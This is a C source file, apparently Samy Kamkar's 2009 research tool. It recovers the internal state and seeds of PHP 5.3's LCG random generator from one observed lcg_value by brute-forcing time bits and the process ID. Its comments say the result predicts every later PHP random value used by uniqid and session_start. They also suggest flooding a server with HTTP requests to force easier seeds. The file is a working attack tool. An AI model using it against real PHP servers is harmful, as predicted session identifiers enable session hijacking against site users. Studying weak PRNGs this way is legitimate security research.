/*
 * To compile: gcc -std=c99 -lm s1s2.c -o s1s2
 *
 * This program will produce the internal state (s1 and s2)
 * and initial seed values of PHP 5.3's LCG (PRNG) given an
 * lcg_value and optional PID of the PHP process the
 * lcg_value was provided from.
 *
 * If brute forcing the PID, on Linux PIDs typically are up
 * to 2**15, while OS X PIDs go up to 2**17. We default to 15.
 *
 * It takes about 0.03s per randomized value PHP has already selected.
 * So if PHP has ran lcg_value/uniqid/session_start 1000 times, this
 * will take 30 seconds to run.
 *
 * Once the initial seed values are produced, you can produce
 * every random value that PHP would produce precisely.
 * See my php-rng-fwd.c to get these values in order.
 *
 * -samy kamkar, code@samy.pl, 08/24/09
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <math.h>

/*
 * combinedLCG() returns a pseudo random number in the range of (0, 1).
 * The function combines two CGs with periods of
 * 2^31 - 85 and 2^31 - 249. The period of this function
 * is equal to the product of both primes.
 */

int q, z;
#define MODMULT(a, b, c, m, s) q = s/a;s=b*(s-a*q)-c*q;if(s<0)s+=m

double combined_lcg(int s1, int s2)
{
	z = s1 - s2;
	if (z < 1)
		z += 2147483562;

	return z * 4.656613e-10;
}

int main(int argc, char** argv)
{	
	if (argc != 3)
	{
		fprintf(stderr, "usage: %s <s2 [PID or 0 to brute force]> <lcg_value>\n", argv[0]);
		return -1;
	}

	// adjust as necessary if you discover the OS in question is NOT on linux
	// for example, OS X uses 2**17 PIDs, linux uses 2**15 (at least the distro I tested)
	int exp216 = exp2(15);
	int s1array[1000001], s2array[exp216+1]; // it's called a time-memory tradeoff. don't complain.
	int i, j, k, l;
	int s2, origs2;
    struct timeval tv;

	/* our lcg value we got from lcg_value() */
	double l1 = strtod(argv[2], NULL);

	/* get our time, we'll brute force 20 bits of this */
	gettimeofday(&tv, NULL);

	/* set PID, pre-modmult for speed */
	origs2 = s2 = atoi(argv[1]);

	/* Number of rounds to test
	 * if it takes too long, i would send lots of http requests 
 	 * to the server until a new process spawns, thus producing
 	 * new seeds easier to produce */
	for (k = 1; k < 1000000; k++)
	{
		printf("Testing for %d round of lcg_value()...\n", k);

		/* iterate s2 value once */
		if (origs2)
			MODMULT(52774, 40692, 3791, 2147483399L, s2);

		/* brute force 20 bits of s1 */
		for (i = 0; i < 1000000; i++)
		{
			if (origs2 == 0 && i % 10000 == 0)
				printf("Brute forcing s1 %d...\n", i);

			if (k == 1)
				s1array[i] = tv.tv_sec ^ (~i);
			MODMULT(53668, 40014, 12211, 2147483563L, s1array[i]);

			/* brute force PID (2 ** 15) if we don't know it*/
			if (origs2 == 0)
			{
				for (j = 1024; j < exp216; j++)
				{
					/* this piece should only happen on the first s1 attempt */
					if (i == 0)
					{
						/* set our initial value on round 1 */
						if (k == 1)
							s2array[j] = j;
						MODMULT(52774, 40692, 3791, 2147483399L, s2array[j]);
					}

					if (fabs(combined_lcg(s1array[i], s2array[j]) - l1) <= 0.00000000000001)
					{
						printf("Possible: s1=%d s2=%d (try another lcg_value() with s2 to confirm)\n",
							tv.tv_sec ^ (~i), j);
						//return 0;
					}
				}
			}
			else
			{
				if (fabs(combined_lcg(s1array[i], s2) - l1) <= 0.00000000000001)
				{
					printf("s1=%d s2=%d\n", tv.tv_sec ^ (~i), origs2);
					return 0;
				}
			}
		}
	}

	return 0;
}

